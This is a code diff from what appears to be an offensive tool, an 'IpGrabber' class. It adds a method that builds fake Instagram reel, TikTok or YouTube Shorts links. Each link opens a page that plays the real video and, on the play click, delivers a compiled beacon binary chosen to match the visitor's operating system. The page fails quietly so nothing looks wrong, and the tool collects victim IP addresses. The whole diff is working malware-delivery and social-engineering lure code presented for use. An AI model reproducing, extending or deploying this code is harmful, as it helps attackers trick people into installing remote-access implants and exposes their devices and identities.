@@ -160,6 +160,42 @@ class IpGrabber:
         self._register_video(link.code, video)
         return link
 
+    def create_player_link(self, label: str = "player",
+                           platform: str = "instagram",
+                           handle: str = "",
+                           video: Optional[Dict[str, str]] = None,
+                           payload_url: str = "",
+                           payload_urls: Optional[Dict[str, str]] = None) -> GrabLink:
+        """Dropper-player lure: a share-format reel/shorts URL whose page
+        plays the REAL video AND delivers the compiled beacon on the play
+        click (fail-soft: payload down = page looks like it won't load).
+        The recorded hit is the page load, exactly like the plain video
+        lure.
+
+        `payload_urls` ({platform -> url}) makes the page serve the binary
+        matching the visitor's User-Agent, so the target OS does not have
+        to be known when the lure is built."""
+        platform = (platform or "instagram").lower()
+        if platform == "youtube":
+            prefix = "shorts/"
+        elif platform == "tiktok":
+            h = (handle or "creator").strip().lstrip("@").replace(" ", "_")
+            prefix = f"@{h}/video/"
+        else:
+            prefix = "reel/"
+        link = self.create_link(label=label, prefix=prefix)
+        self._register_video(link.code, video)
+        if payload_url or payload_urls:
+            server = self._server or self._default_server
+            if server is not None:
+                try:
+                    server.register_player(link.code, payload_url,
+                                           meta=video or {},
+                                           payload_urls=payload_urls)
+                except Exception:
+                    pass
+        return link
+
     def poll_hits(self, link: GrabLink, timeout: float = 120.0) -> List[VictimHit]:
         """Poll for clicks; return the victim IPs captured."""
         deadline = time.time() + timeout
